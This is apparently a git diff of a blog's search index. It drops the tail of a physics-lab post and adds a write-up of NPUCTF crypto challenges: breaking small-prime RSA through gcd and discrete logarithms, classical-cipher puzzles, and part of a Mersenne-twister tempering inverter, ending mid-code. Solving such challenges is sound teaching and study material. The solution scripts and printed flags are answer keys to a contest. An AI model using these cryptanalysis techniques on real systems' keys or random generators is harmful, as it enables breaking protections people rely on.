log(-a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*(4\*I0\*a\*µ\*ω\*sin(0.3\*π)\*sin(t\*ω) - I0\*a\*µ\*ω\*sin(t\*ω)) - (-log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 - (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)) + log(a\*cos(0.4\*π)&#x2F;2 + t\*v&#x2F;2 + (-a\*\*3\*π\*cos(0.4\*π)\*\*3 - 2\*a\*\*2\*t\*v\*π\*cos(0.4\*π)\*\*2 - a\*t\*\*2\*v\*\*2\*π\*cos(0.4\*π))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))&#x2F;(2\*a\*π\*(a\*cos(0.4\*π) + t\*v)\*cos(0.4\*π)))\*(-4\*I0\*a\*µ\*ω\*sin(0.3\*π)\*sin(t\*ω) + I0\*a\*µ\*ω\*sin(t\*ω)) + (2.0\*I0\*v\*µ\*(a + t\*v\*cos(0.3\*π))\*sin(0.3\*π)\*cos(t\*ω)&#x2F;(sqrt(3)\*a&#x2F;2 + t\*v) + 2.0\*I0\*v\*µ\*log(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2\*I0\*v\*µ\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2.0\*I0\*µ\*ω\*(a + t\*v\*cos(0.3\*π))\*log(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*sin(t\*ω) + 2\*I0\*µ\*ω\*(sqrt(3)\*a&#x2F;2 + t\*v)\*sin(0.3\*π)\*sin(t\*ω)\*cos(0.3\*π))&#x2F;(2\*π) - (2.0\*I0\*v\*µ\*(a + t\*v\*cos(0.3\*π))\*sin(0.3\*π)\*cos(t\*ω)&#x2F;(sqrt(3)\*a + t\*v) + 2.0\*I0\*v\*µ\*log(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2\*I0\*v\*µ\*sin(0.3\*π)\*cos(0.3\*π)\*cos(t\*ω) - 2.0\*I0\*µ\*ω\*(a + t\*v\*cos(0.3\*π))\*log(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*sin(t\*ω) + 2\*I0\*µ\*ω\*(sqrt(3)\*a + t\*v)\*sin(0.3\*π)\*sin(t\*ω)\*cos(0.3\*π))&#x2F;(2\*π)</span><br></pre></td></tr></table></figure>
-<h2 id="存在的问题和当前解决方案">存在的问题和当前解决方案</h2>
-<p>仍然存在的问题是形状没有真正的任意性，停留在多边形的层次上。</p>
-<p>为了解决这个问题，实现进一步的推广，只能用微元的思想，将一个任意的形状切割成梯形/矩形的微元，然后积分计算。</p>
-<p>由于任意形状又有可能涉及非常不规则的图形，分割了也没有明确的函数表达式，依然不可计算。这里提供一种思路。之前提到梯形的上下底可以平移，那么我们可以将它平移成类似函数的形式：</p>
-<p><img src="/2019/06/01/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86%E5%AE%9E%E9%AA%8C/image-20200601205157557.png" alt="image-20200601205157557"></p>
-<p>之后可以用幂级数拟合曲线（泰勒级数），从而可以得到任意形状的函数表达式，当然用傅里叶级数更加合适，因为它对函数图像的要求更低（不需要高阶偏导连续）。</p>
-<p>而函数值即上下的差值，这一点利用计算机的计算还是比较容易解决的。之后再延续上</p>
-<h1>项目原地址</h1>
-<p><a href="https://github.com/ZER0-Nu1L/Physical-programming" target="_blank" rel="noopener">https://github.com/ZER0-Nu1L/Physical-programming</a></p>
-<h1>总结</h1>
-<p>本实验贯彻了大一学习和接触的大部分思想，基于思想投入实践，实现数学思维、物理思维、计算思维的初步融合。<br>
-在理论推导上，结合观察和猜想，利用微元的思想、数学本质分析，实现在电流强度变化的直导线产生的磁场中任意形状线框运动产生电动势。<br>
-在计算思维上，利用计算机的计算能力解决手动求解的繁琐，借助Python的计算生态，避免重复造轮子，快速检索和学习所需模块，实现积分导数计算、数据可视化，首次进行面向对象编程开发，开发了简单的 GUI，<br>
-不足的地方很多，一是UI界面原本想实现调整滑动条的参数来显示结果，但是由于计算规模太大，程序经常卡壳，目前想到的方案是将滑动条对应的每一个状态单独运行出来，保存为图片，之后改变程序内部运行的映射关系，将滑动条每一个状态对应一个科学计算变为滑动条每一个状态对应一张图片。二是理论推导在最后一步没有深入下去，当时分析了好久没有办法推进，可能受限于自己的数学知识。</p>
-<h1>参考文献</h1>
-<ol>
-<li>孙云卿、雷雨.大学物理学(下册)孙云卿（第二版）[M].科学出版社,2017,01-01</li>
-<li>滕保华,、吴喆、廖旭.大学物理学学习指导 [M].科学出版社,2018,09-05</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Development</category>
-        <category>Physics</category>
-      </categories>
-      <tags>
-        <tag>Physics</tag>
-        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -2464,6 +2587,283 @@ mod_security模块，一个开源的WAF模块，有专门针对慢速攻击防�
       </categories>
   </entry>
   <entry>
+    <title>NPUCTF Write Up</title>
+    <url>/2020/04/21/NPUCTF-Writeup/</url>
+    <content><![CDATA[<p>周末的时候做了 NPUCTF  Crypto 部分的题目，题目有些一言难尽，但还是有很多收获，写了点 Write up。<br>
+（☁️更新中…… ）</p>
+<a id="more"></a>
+<h1>认清形势，建立信心</h1>
+<p>附件: <strong><a href="http://task.py" target="_blank" rel="noopener">task.py</a></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q </span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">169169912654178</span></span><br><span class="line"><span class="string">128509160179202</span></span><br><span class="line"><span class="string">518818742414340</span></span><br><span class="line"><span class="string">358553002064450</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<h2 id="分析与解">分析与解</h2>
+<p>考点：简单数论、DLP</p>
+<h3 id="分析">分析</h3>
+<p>$$<br>
+c = m^e \pmod n<br>
+\\<br>
+c_1 = 2^e \pmod n<br>
+\\<br>
+c_2 = 4^e \pmod n<br>
+\\<br>
+c_3 = 8^e \pmod n<br>
+\\<br>
+\text{其中，} c, c_1, c_2, c_3 是已知的，其余的均未知。<br>
+$$</p>
+<blockquote>
+<p>未知参数过少，正是麻烦所在。</p>
+<p>基本思路是分别求出 <code>n</code>, <code>e</code>，之后就可以对 <code>c </code> 进行解密</p>
+</blockquote>
+<h3 id="解析">解析</h3>
+<h4 id="参数-n">参数 <code>n</code></h4>
+<p>$2, 4, 8$, 可以看成 $2^1, 2^2, 2^3$，故 $c_1, c_2, c_3$ 存在如下关系：<br>
+$$<br>
+c_1^2 = c_2 \pmod n<br>
+\\<br>
+c_1^3 = c_3 \pmod n<br>
+\\<br>
+\therefore n , | , gcd(c_1^2 - c_2, c_1^3 - c_3)<br>
+$$<br>
+所以可以得到 $n$</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c1 = <span class="number">128509160179202</span></span><br><span class="line">c2 = <span class="number">518818742414340</span></span><br><span class="line">c3 = <span class="number">358553002064450</span></span><br><span class="line">gcd = gmpy2.gcd(c1**<span class="number">2</span>-c2, c1**<span class="number">3</span>-c3)</span><br></pre></td></tr></table></figure>
+<p>得到：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcd = <span class="number">2</span> * <span class="number">18195301</span> * <span class="number">28977097</span></span><br><span class="line"><span class="comment"># 猜测&amp;尝试</span></span><br><span class="line">n = <span class="number">18195301</span> * <span class="number">28977097</span></span><br></pre></td></tr></table></figure>
+<h4 id="参数-e">参数 <code>e</code></h4>
+<p>$$<br>
+c=2^e \pmod {18195301 * 28977097}<br>
+$$</p>
+<p>这是典型的 DLP（Discrete Logarithm Problem，离散对数问题）</p>
+<h4 id="Wolfram-爆破">Wolfram 爆破</h4>
+<p>可以用 Wolfram：（应该是用纯暴力枚举的方法，虽然底层是 C 语言，但之前二次剩余跑了十七个小时也没跑出来 🤧）</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line">	<span class="keyword">Reduce</span>[</span><br><span class="line">	  c == <span class="keyword">Mod</span>[<span class="number">2</span>^k, p] /. &#123;c -&gt; <span class="number">128509160179202</span>, p -&gt; <span class="number">527247002021197</span>&#125;, k,<span class="keyword">Integers</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>得到结果：</p>
+<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">C[<span class="number">1</span>] \[<span class="keyword">Element</span>] <span class="keyword">Integers</span> &amp;&amp; C[<span class="number">1</span>] &gt;= <span class="number">0</span> &amp;&amp; k == <span class="number">808723997</span> + <span class="number">4393724623740</span> C[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+<p>得到 <code>e=808723997</code>，并在终端进行简单验证：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> pow(<span class="number">2</span>, <span class="number">808723997</span>, n) == c1</span><br></pre></td></tr></table></figure>
+<h4 id="常规解密">常规解密</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Python2.7</span></span><br><span class="line"><span class="comment"># Author: ZER0-Nu1L</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line">e = <span class="number">808723997</span></span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line">n = q * p</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = long_to_bytes(pow(c, d, n))</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npuctf&#123;345y&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="另解-BSGS-算法">另解 BSGS 算法</h4>
+<blockquote>
+<p>BSGS（Baby Step Giant Step） 虽然不是 DLP 算法中 时间空间复杂度最低的算法，但相对于 Pollard’s $\rho$ 算法（当前认为最优的算法）实现起来容易很多，时间复杂度（$O(\sqrt n)$）相同，所以无论是 ICPC 还是 CTF 都是最优的选择之一。</p>
+</blockquote>
+<p>C 语言需要调大整数库，实现起来稍微比较麻烦。<br>
+Python 的 BSGS 板子（没有优化）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, a, p)</span>:</span></span><br><span class="line">    <span class="comment"># To solve g^e mod p = a and find e</span></span><br><span class="line">    <span class="comment"># define x = j*m + i</span></span><br><span class="line">    res = []</span><br><span class="line">    m = int(ceil(sqrt(p<span class="number">-1</span>)))</span><br><span class="line">    <span class="comment"># Baby Step</span></span><br><span class="line">    lookup_table = &#123;pow(g, i, p): i <span class="keyword">for</span> i <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    <span class="comment"># Giant Step Precomputation c = g^(-m) mod p</span></span><br><span class="line">    c = pow(g, m*(p<span class="number">-2</span>), p)</span><br><span class="line">    <span class="comment"># Giant Step</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):</span><br><span class="line">        x = (a*pow(c, j, p)) % p</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> lookup_table:</span><br><span class="line">			res.append( j*m + lookup_table[x])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<p>先把原式子拆成：<br>
+$$<br>
+c=2^e \pmod {18195301 * 28977097} \Rightarrow<br>
+\begin{cases}<br>
+c=2^{e_1} \pmod {18195301}<br>
+\\<br>
+c=2^{e_2} \pmod {28977097}<br>
+\end{cases}<br>
+$$</p>
+<p>分别用 BSGS 算法求出指数，然后用中国剩余定理（下面是 <a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/" target="_blank" rel="noopener">0xDktb 师傅的代码</a>）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line">c1_p, c1_q = c1 % p, c1 % q</span><br><span class="line">e_1, e_2 = bsgs(<span class="number">2</span>, c1_p, p), bsgs(<span class="number">2</span>, c1_q, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e_n = [] <span class="comment"># e % n</span></span><br><span class="line"><span class="keyword">for</span> e_p <span class="keyword">in</span> e_1:</span><br><span class="line">    <span class="keyword">for</span> e_q <span class="keyword">in</span> e_2:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e_n.append(crt([e_p, e_q], [p - <span class="number">1</span>, q - <span class="number">1</span>])) <span class="comment"># e % phi</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">more_e_n = []</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> e_n:</span><br><span class="line">    i = (n - e) // phi</span><br><span class="line">    more_e_n += [e + j * phi <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, i + <span class="number">1</span>)]</span><br><span class="line">e_n += more_e_n</span><br><span class="line"></span><br><span class="line">d_n = [inverse(e, phi) <span class="keyword">for</span> e <span class="keyword">in</span> e_n]</span><br><span class="line"></span><br><span class="line">m_n = set()</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_n:</span><br><span class="line">    m_n.add(pow(c, d, n))</span><br><span class="line">m_n = list(m_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_n:</span><br><span class="line">    print(<span class="string">b'npuctf&#123;'</span> + long_to_bytes(m) + <span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure>
+<hr>
+<h1>这是什么觅🐎</h1>
+<p>附件: zip</p>
+<p>解压之后得到图片<br>
+<img src="/2020/04/21/NPUCTF-Writeup/image-20200421115433262.png" alt="image-20200421115433262" style="zoom:50%;"></p>
+<h2 id="分析与解-v2">分析与解</h2>
+<h3 id="第一印象">第一印象</h3>
+<p>密文：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br></pre></td></tr></table></figure>
+<p>容易想到字母对应星期x 的英文首字母：<br>
+Monday - M, Tuesday - T1, Wednesday - W, Thursday - T2，Friday - F， Saturday - S1， Sunday - S2<br>
+紧接着的数字是行号相关的，所以猜测：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3 	1 	12 	5 	14 	4 	8 	18</span><br><span class="line">3 	8 	12 	5 	14 	4 	8 	18</span><br><span class="line">flag&#123;31125144118&#125;</span><br><span class="line">flag&#123;0308120514040818&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
+<h3 id="细节补充">细节补充</h3>
+<p>还有两个细节：</p>
+<ol>
+<li><code>1</code> 被差掉了</li>
+<li>数字 2 - 8 有圈</li>
+</ol>
+<h4 id="细节一">细节一</h4>
+<p>猜测：1 -&gt; <code>$</code>。即 所有 1  都替换成 <code>$</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3$$25$44$$8&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
+<p>猜测：日历上的1跳过，即 W1 表示 8</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;38125144818&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
+<h4 id="细节二">细节二</h4>
+<p>是否暗示 flag 所有的字符集都是在 2-8 之间呢？那 <code>F</code> 等之后的数字不意味着行，而意味着向后走 n 位。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3   1   6   5   8   4   1   6</span><br><span class="line">flag&#123;31658416&#125;</span><br></pre></td></tr></table></figure>
+<p>这个猜想最大的问题在于 <code>S22</code> = <code>S13</code> ，不是唯一标识。<br>
+结合细节一和细节二：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31658416 # 结合红圈，移位</span><br><span class="line">3$6584$6 # 结合红圈，移位 + 1 -&gt; $</span><br><span class="line">38658486 # 结合红圈，移位 + 1 -&gt; 8</span><br></pre></td></tr></table></figure>
+<p>均失败…… 😭😭😭</p>
+<h3 id="正解">正解</h3>
+<p>实际上，在第一步得到数字之和，转成字母就是 flag 😲</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3 	1 	12 	5 	14 	4 	8 	18</span><br><span class="line">c   a   l   e   n   d   h   r</span><br><span class="line">flag&#123;calendhr&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="陷入沉思">陷入沉思</h2>
+<p>果然是我想多了吗？？<br>
+可能是这方面的题目没怎么研究过😭</p>
+<h1>Classical_Cipher</h1>
+<p>附件：<strong>flag.zip</strong><br>
+<strong>key.txt</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">压缩包密码：	gsv_pvb_rh_zgyzhs</span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure>
+<h2 id="压缩包密码">压缩包密码</h2>
+<p>容易发现，已知明文中 <code>pvb</code> 和 <code>key</code> 存在互补关系（<code>ord(c) + ord(m) - 2*ord('a') % 25 == 0</code>）（atbash 密码的典型特征）<br>
+写个简单脚本处理一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher= <span class="string">"gsvpvbrhzgyzhs"</span></span><br><span class="line">msglst = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">	msglst.append(chr(<span class="number">25</span> - (ord(c)-ord(<span class="string">'a'</span>)) + ord(<span class="string">'a'</span>)))</span><br><span class="line">message = <span class="string">""</span>.join(msglst)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
+<p>得到压缩包密码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">the_key_is_atbash</span><br></pre></td></tr></table></figure>
+<h2 id="图案密码">图案密码</h2>
+<p>经过解压后得到图片：<br>
+解压之后得到图片 flag.png<br>
+<img src="/2020/04/21/NPUCTF-Writeup/image-20200421122027883.png" alt="image-20200421122027883" style="zoom:67%;"></p>
+<p>可以看到猪圈密码和四个陌生的符号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">j ? ? p p l j ? ? j ? ? k</span><br></pre></td></tr></table></figure>
+<p>那四个陌生的符号可能是图标含义英文的首字母。<br>
+后来看 WP 的时候才知道是古埃及象形文字……（为什么破解古典密码的人这么多 😭，我……）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">j l w p p l j w l j o d k</span><br><span class="line">flag&#123;jlwppljwljodk&#125;</span><br><span class="line"># 不知道是不是这个格式</span><br></pre></td></tr></table></figure>
+<h1>Mersenne_twister</h1>
+<p>附件1：cipher.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cef4876036ee8b55aa59bca043725bf350a5e491debdef7ef7d63e9609a288ca1e2c82a7fe566bd8709e73c8d495ea504a486ed11189faf8e6fb35617e47d2d1ad5e4783e96afeaae9f7104ec477fb39fe4ec619bf58289709e15c4449f03fc51cba918cd0ebfdc12376b41e7815406482733b3b200826b6c78d86563edaea94dccf459a4291517a4b8367d7b4a53aeecd7e0accf661bfc726f5ba62e1c0e04100108ad32e7d5711f780185cba5cf31d328bee84066be4ab9582cf9d4bfe3c6f96a7732e1c37d800c90fd46277147f0a26c149dcd5eeb0f2df0c075627bc220be5eefdd67186056ac28c21e155a7f247664aaecdb498134de274df10114d1f06f84dd21820f150d69c9439d909dec0f5ccfeab61b62db2ea91d31bc8163ff16c7f458006bd5ac4a5f5bfae2770b23ccfb7195b76aa0a9aa146831667a7b9fe08c19e691afadccb3ca5169ef3fabaa3dad47d536e89ed4cee6f788bc969c3ad3137850ebfc46a73af2b0c036c3da4b4a16506f499445c604dd73eeb846a52f881515a3ad0ab448b4f9ed3e0ab1fffac60b223dde6450ba6198e90e14de107aaf2</span><br></pre></td></tr></table></figure>
+<p>附件2：Mersenne_twister.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify , unhexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag ,seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">26</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">'npuctf&#123;'</span></span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line">XOR = <span class="keyword">lambda</span> s1 ,s2 : bytes([x1 ^ x2 <span class="keyword">for</span> x1 ,x2 <span class="keyword">in</span> zip(s1 , s2)])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt73991</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">        self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        self.srand()</span><br><span class="line">        self.generate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">            self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">            self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">            y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">                temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">            self.state[i] = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getramdanbits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.flag == <span class="number">233</span>:</span><br><span class="line">            self.generate()</span><br><span class="line">            self.flag = <span class="number">0</span></span><br><span class="line">        bits = self.Next(self.state[self.flag]).to_bytes(<span class="number">4</span> , <span class="string">'big'</span>)</span><br><span class="line">        self.flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = flag.encode()</span><br><span class="line">    random = mt73991(seed)</span><br><span class="line">    f = open(<span class="string">'./cipher.txt'</span> , <span class="string">'wb'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">        cipher = encrypt(key , chr(i).encode())</span><br><span class="line">        f.write(cipher)</span><br></pre></td></tr></table></figure>
+<h2 id="分析-v2">分析</h2>
+<p>提供了它这里使用的梅森旋转算法<br>
+加密思路是：<br>
+​	每次加密明文：flag 里的每个字符<br>
+​	密钥：由 mt73991 对象生成的伪随机数（四个拼在一起）<br>
+​	加密函数：对明文一次 md5 加密，之后，加密后的明文和密钥逐位异或</p>
+<h2 id="解析-v2">解析</h2>
+<p>尝试写了一个对伪随机数预测的程序:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Mersenne_twister <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify , unhexlify</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemperInverser</span>:</span></span><br><span class="line">    __b = <span class="number">0x9ddf4680</span>    <span class="comment"># 比特遮罩1</span></span><br><span class="line">    __c = <span class="number">0xefc65400</span>    <span class="comment"># 比特遮罩2</span></span><br><span class="line">    __d = <span class="number">0x34adf670</span>    <span class="comment"># 比特遮罩3</span></span><br><span class="line">    __kMaxBits      =  <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_right_shift_xor</span><span class="params">(self, value, shift, mask)</span>:</span></span><br><span class="line">        i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">            part_mask = ((self.__kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; self.__kMaxBits) &gt;&gt; (i * shift)</span><br><span class="line">            part = value &amp; part_mask</span><br><span class="line">            value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">            result |= part</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_left_shift_xor</span><span class="params">(self, value, shift, mask)</span>:</span></span><br><span class="line">        i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">            part_mask = (self.__kMaxBits &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (i * shift)</span><br><span class="line">            part = value &amp; part_mask</span><br><span class="line">            value ^= (part &lt;&lt; shift) &amp; mask</span><br><span 